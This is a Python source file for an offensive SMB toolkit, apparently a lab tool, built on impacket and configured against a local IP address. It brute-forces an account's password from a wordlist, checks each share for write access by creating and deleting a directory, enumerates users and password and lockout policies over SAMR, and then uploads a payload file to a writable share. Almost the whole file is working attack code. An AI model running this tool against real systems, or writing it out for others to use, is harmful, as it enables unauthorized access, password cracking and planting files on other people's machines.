from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21
from impacket.dcerpc.v5 import samr, transport, rpcrt
from impacket.dcerpc.v5.dtypes import RPC_SID
from impacket.dcerpc.v5.rpcrt import DCERPCException
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from colorama import Fore
from smb_service import check_SMB
import sys

print(Fore.RED + """
┏┓┏┓┳┓┳┓┏┓┳┓┳┳┏┓
┃ ┣ ┣┫┣┫┣ ┣┫┃┃┗┓
┗┛┗┛┛┗┻┛┗┛┛┗┗┛┗┛ """ + Fore.WHITE + "Advanced Multi Threaded SMB Toolkit V1.4 Developed by" + " \033[38;5;208mThe Intrusion Team\033[0m"  + Fore.RESET)

class Config:
    max_workers = 2  # Adjust Theads
    target_ip = "10.1.1.41"  # Set target's IP address
    port = 445 # Set port
    username = "IEUser"  # Set username
    domain = "Builtin"  # Set domain if necessary, else leave as empty string
    password_file_path = "passwords.txt"  # Path to your password file
    local_file_path = 'Payloads/skull.jpg'
    remote_file_path = 'skull.jpg'

writable_shares = []
system_users = []

check_SMB(Config.target_ip,Config.port)
    
print("[" + Fore.RED + "User Account" + Fore.RESET + "] " + Fore.WHITE + Config.username + Fore.RESET)
print("[" + Fore.RED + "Password File" + Fore.RESET + "] " + Fore.WHITE + Config.password_file_path + Fore.RESET)
print("[" + Fore.RED + "Concurrent Workers" + Fore.RESET + "]", Fore.WHITE, Config.max_workers, Fore.RESET)

try:
    smb = SMBConnection(remoteName=Config.target_ip, remoteHost=Config.target_ip)
    negotiated_protocol = smb.getDialect()
    if negotiated_protocol >= 0x0311:
        print("[" + Fore.RED + "SMB Version" + Fore.WHITE + "] " + "3.1.1")
    elif negotiated_protocol == 0x0302:
        print("[" + Fore.RED + "SMB Version" + Fore.WHITE + "] " + "3.0.2")
    elif negotiated_protocol == 0x0300:
        print("[" + Fore.RED + "SMB Version" + Fore.WHITE + "] " + "3.0")
    elif negotiated_protocol == 0x0210:
        print("[" + Fore.RED + "SMB Version" + Fore.WHITE + "] " + "2.1")
    elif negotiated_protocol == 0x0202:
        print("[" + Fore.RED + "SMB Version" + Fore.WHITE + "] " + "2.0.2")
    else:
        print("[" + Fore.RED + "SMB Version" + Fore.WHITE + "] " + "V1 or earlier")
except Exception as e:
    print("[" + Fore.RED + "SMB Version" + Fore.RESET + "] " + negotiated_protocol)

bruteforce = input("[" + Fore.RED + "Start Bruteforce Attack? " + Fore.WHITE + "Y/N " + Fore.RESET)
if bruteforce.upper() == "N":
    print("[" + Fore.RED + "Initiating Program Shutdown" + Fore.RESET + "] " + Fore.WHITE + "Exiting")
    sys.exit()

# Function to read passwords from a file
def read_passwords_from_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def smb_login(password):
    try:
        smb = SMBConnection(remoteName=Config.target_ip, remoteHost=Config.target_ip)
        smb.login(Config.username, password, domain=Config.domain)
        shares = smb.listShares()
        # Test each share for write access
        for share in shares:
            share_name = share['shi1_netname'][:-1]  # Remove the trailing null byte
            try:
                # Try creating a directory (then delete it) to test write access
                test_dir_name = 'smb_test_dir' # directory name
                smb.createDirectory(share_name, test_dir_name) # create directory
                smb.deleteDirectory(share_name, test_dir_name) # delete directory
                writable_shares.append(share_name)
            except Exception as e:
                #print(f"{str(e)}")
                pass

        smb.logoff()
        correct_password = password
        return f"Password Cracked:{password}" # returns password and string Password Cracked
    except OSError:
        return f"{Config.target_ip}:Target Unreachable" # returns target ip with string target Unreachable
    except Exception as e:
        if "STATUS_ACCOUNT_LOCKED_OUT" in f"{str(e)}": # check if user account has been locked
            return f"Account Locked:{Config.username}" # returns string Account Locked with username
        else:
            return None

def upload_file(remote_host, username, password, domain, local_file_path, remote_share, remote_file_path):
    try:
        smb_connection = SMBConnection(remote_host, remote_host)
        smb_connection.login(username, password, domain)

        # Open the local file
        with open(local_file_path, 'rb') as file_obj:
            # Store the file on the remote share
            smb_connection.putFile(remote_share, remote_file_path, file_obj.read)

        print(Fore.RED + "   └──=>" + " \033[38;5;208m[*]\033[0m " + Fore.WHITE + f"File Uploaded Successfully: {remote_file_path}" + Fore.RESET)
    except Exception as e:
        print(Fore.RED + "   └──=>" + Fore.RED + " [File Upload Failed] " + Fore.WHITE + f"{e}" + Fore.RESET)

def convert_to_minutes(duration_in_100ns_units):
    # Convert the duration from 100-nanosecond units to minutes
    seconds = abs(duration_in_100ns_units) / 1e7
    return seconds / 60

def enum_users(target, username, password):
    try:
        # Setup SMB transport
        string_binding = fr'ncacn_np:{target}[\pipe\samr]'
        rpctransport = transport.DCERPCTransportFactory(string_binding)
        rpctransport.set_credentials(username, password)

        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)

        # Connect to the SAMR service
        resp = samr.hSamrConnect(dce)
        serverHandle = resp['ServerHandle']

        # Enumerate domains
        domains_resp = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
        domains = domains_resp['Buffer']['Buffer']

        for domain in domains:
            #print(f"[+] Found domain: {domain['Name']}")

            resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domain['Name'])
            domainSid = resp['DomainId']

            resp = samr.hSamrOpenDomain(dce, serverHandle=serverHandle, domainId=domainSid)
            domainHandle = resp['DomainHandle']

            # Enumerate users
            enumerationContext = 0
            while True:
                try:
                    users_resp = samr.hSamrEnumerateUsersInDomain(dce, domainHandle, enumerationContext=enumerationContext)
                    enumerationContext = users_resp['EnumerationContext']
                    for user in users_resp['Buffer']['Buffer']:
                        system_users.append([user["Name"]])
                        #print(f"[*] Found user: {user['Name']}")

                    if users_resp['ErrorCode'] != 0 or len(users_resp['Buffer']['Buffer']) == 0:
                        break
                except DCERPCException as e:
                    print("[" + Fore.RED + "DCERPCException" + Fore.WHITE +  f"{e}")
                    break

            samr.hSamrCloseHandle(dce, domainHandle)

        samr.hSamrCloseHandle(dce, serverHandle)
        dce.disconnect()
    except Exception as e:
        print("[" + Fore.RED + "Error" + Fore.WHITE + "] " + Fore.WHITE + f"{e}")

def query_domain_policy(target, username, password):
    try:
        string_binding = rf'ncacn_np:{target}[\pipe\samr]'
        rpctransport = transport.DCERPCTransportFactory(string_binding)
        rpctransport.set_credentials(username, password)

        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)

        resp = samr.hSamrConnect(dce)
        serverHandle = resp['ServerHandle']

        resp = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
        domains = resp['Buffer']['Buffer']
        domainName = domains[0]['Name']

        resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domainName)
        domainSid = resp['DomainId']

        resp = samr.hSamrOpenDomain(dce, serverHandle=serverHandle, domainId=domainSid)
        domainHandle = resp['DomainHandle']

        # Using integer values directly for the information class parameters
        # 1 corresponds to DOMAIN_PASSWORD_INFORMATION
        # 3 corresponds to DOMAIN_LOCKOUT_INFORMATION
        resp = samr.hSamrQueryInformationDomain(dce, domainHandle, 1)
        passwordPolicy = resp['Buffer']['Password']
        print("[" + Fore.RED + "Found Users" + Fore.WHITE + "] " + ", ".join(auth[0] for auth in system_users),Fore.RESET)
        print("[" + Fore.RED + "Password Policy" + Fore.WHITE + "] " + f"Password history length: {passwordPolicy['PasswordHistoryLength']}, Min password length: {passwordPolicy['MinPasswordLength']}" + Fore.RESET)

        dce.disconnect()
    except DCERPCException as e:
        print("[" + Fore.RED + "DCERPCException" + Fore.WHITE +  f"{e}")
    except Exception as e:
        print("[" + Fore.RED + "Error" + Fore.WHITE + "] " + Fore.WHITE + f"{e}")

def query_lockout_policy(target_ip, domain, username, password):
    try:
        # Create an SMB connection
        conn = SMBConnection(target_ip, target_ip)

        # Authenticate
        conn.login(username, password, domain)

        # Setup the RPC connection to SAMR
        string_binding = r'ncacn_np:%s[\pipe\samr]' % target_ip
        rpctransport = transport.DCERPCTransportFactory(string_binding)
        rpctransport.set_smb_connection(conn)

        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)

        # Obtain a handle to the domain
        resp = samr.hSamrConnect(dce)
        serverHandle = resp['ServerHandle']
        resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domain)
        domainId = resp['DomainId']

        resp = samr.hSamrOpenDomain(dce, serverHandle=serverHandle, domainId=domainId)
        domainHandle = resp['DomainHandle']

        # Query domain lockout policy
        resp = samr.hSamrQueryInformationDomain(dce, domainHandle, samr.DOMAIN_INFORMATION_CLASS.DomainLockoutInformation)
        
        lockoutInfo = resp['Buffer']['Lockout']
        lockoutDuration = lockoutInfo['LockoutDuration']
        lockoutObservationWindow = lockoutInfo['LockoutObservationWindow']
        lockoutThreshold = lockoutInfo['LockoutThreshold']

        # Convert lockout duration and observation window to minutes
        lockoutDurationMinutes = convert_to_minutes(lockoutDuration)
        lockoutObservationWindowMinutes = convert_to_minutes(lockoutObservationWindow)

        print("[" + Fore.RED + "Lockout Policy" + Fore.WHITE + "] " + f"Lockout Duration: {lockoutDurationMinutes} minutes, Observation Window: {lockoutObservationWindowMinutes} minutes, Login Attempts: {lockoutThreshold}" + Fore.RESET)

        # Clean up
        dce.disconnect()

    except rpcrt.DCERPCException as e:
        print("[" + Fore.RED + "DCERPCException" + Fore.WHITE +  f"{e}")
    except Exception as e:
        print("[" + Fore.RED + "Error" + Fore.WHITE + "] " + Fore.WHITE + f"{e}")

def main():
    # Ensure passwords are read and available here
    passwords = read_passwords_from_file(Config.password_file_path)
    print("[" + Fore.RED + "Login Attempts" + Fore.RESET + "]", Fore.WHITE, len(passwords), Fore.RESET)
    
    with ThreadPoolExecutor(max_workers=Config.max_workers) as executor:
        # Set up the progress bar
        futures = [executor.submit(smb_login, password) for password in passwords]
        progress = tqdm(as_completed(futures), total=len(passwords), desc="[*] Bruteforcing Password",leave=False)
        for future in progress:
            result = future.result()
            if result:
                progress.set_description("[" + Fore.RED + result.split(":")[0] + Fore.RESET + "] " + Fore.WHITE + result.split(":")[1] + Fore.RESET) # splits result string from return value to get status and result
                correct_password = result.split(":")[1]
                progress.refresh()  # Update the progress bar immediately
                break  # Stop after the first success
            progress.set_description("Password attempts")
        progress.close()

    if "Account Locked" not in result: # if account locked out pass
        print("[" + Fore.RED + "Enumerating" + Fore.WHITE + "] " + "System Users & Password Policy" + Fore.RESET)
        enum_users(Config.target_ip, Config.username, correct_password) # Get users
        query_domain_policy(Config.target_ip, Config.username, correct_password) # Get password policy
        query_lockout_policy(Config.target_ip, Config.domain, Config.username, correct_password) # Get lockout

        print(Fore.WHITE + "[" + Fore.RED + "Exploitation" + Fore.WHITE + "]" + Fore.RESET)
        for x in writable_shares:
            print(Fore.RED + "   └──=>" + " \033[38;5;208m[*]\033[0m " + Fore.WHITE + "Found Writable Share: " + x + Fore.RESET) # print writable shares

        upload = input(Fore.RED + "   └──=>" + " \033[38;5;208m[!]\033[0m " + Fore.WHITE + "Upload File " + "Y/N? " + Fore.RESET)
        if upload.lower() == "n":
            sys.exit()
        if upload.lower() == "y":
            sharex = input(Fore.RED + "   └──=>" + " \033[38;5;208m[!]\033[0m " + Fore.WHITE + "Enter Share Name: " + Fore.RESET)
            upload_file(Config.target_ip, Config.username, correct_password, Config.domain, Config.local_file_path, sharex, Config.remote_file_path) # Test file upload

    if "Password Cracked" not in result: # if account locked out pass:
        print("[" + Fore.RED + "Bruteforce Failed" + Fore.WHITE + "] " +  "Password not Found")
main()
